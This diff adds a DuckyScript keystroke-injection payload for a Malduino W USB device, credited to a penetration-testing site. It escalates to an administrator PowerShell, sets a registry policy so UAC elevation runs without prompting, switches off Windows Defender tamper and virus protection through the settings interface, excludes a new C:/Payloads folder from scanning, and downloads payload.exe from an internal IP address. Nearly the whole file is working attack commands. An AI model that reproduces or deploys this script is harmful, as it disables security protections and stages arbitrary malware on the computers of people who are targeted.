@@ -1,0 +1,75 @@
+REM -----------------------------------------------------------------------------------------
+REM   This payload disables Tamper and Virus Protection Win 11 22H2,
+REM   creates payload directory in c:\Payloads, adds this directory
+REM   as an exclusion in WIndows Defender, downloads payload from
+REM.  URL.
+REM   Pentestit.de - Frank Neugebauer (06.01.2023)
+REM   Tested with Lenovo Thinkpad T440 (German Keyboard) and
+REM   Malduino W from Maltronics
+REM   https://docs.maltronics.com/devices/malduino-w
+REM   Use run_payload.txt to run the payload on the target system and
+REM   cleanup.txt to clean everthing up and start Virus Protection again.
+REM   Currently supported layouts: DE, GB, US, ES, FR, DK, RU
+REM   ---------------------------------------------------------------------------------------
+LOCALE DE
+DEFAULTDELAY 2000
+REM LED off
+LED 0 0 0
+REM LED red
+LED 255 0 0
+REM Run PowerShell as Administrator
+GUI r
+STRING powershell Start-Process powershell -Verb runAS
+ENTER
+TAB
+TAB
+ENTER
+REM Use ALT j as an alternative
+REM This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials
+STRING reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+ENTER
+STRING exit
+ENTER
+Gui s
+REM Run Disable Tamper and Virus Protection 
+STRING Viren- und Bedrohungsschutz
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+SPACE
+TAB
+SPACE
+TAB
+SPACE
+TAB
+TAB
+SPACE
+ALT F4
+REM LED yellow
+LED 255 255 0
+Gui r
+REM Run PowerShell as Administrator
+STRING powershell Start-Process powershell -Verb runAS
+ENTER
+REM Create Payload Directory
+STRING cd C:/
+ENTER
+STRING mkdir Payloads
+ENTER
+REM Makes an exclusion to the Payloads folder in Windows Defender
+STRING  Set-MpPreference -ExclusionPath C:/Payloads
+ENTER
+REM Navigates to Payload directory
+STRING cd C:/Payloads
+ENTER
+REM Downloads specified payload from URI
+REM Change source and destination to your needs
+STRING Start-BitsTransfer -Source http://192.168.171.136/payload.exe  -Destination ./payload.exe
+ENTER
+STRING exit
+ENTER
+REM LED green
+LED 0 255 0
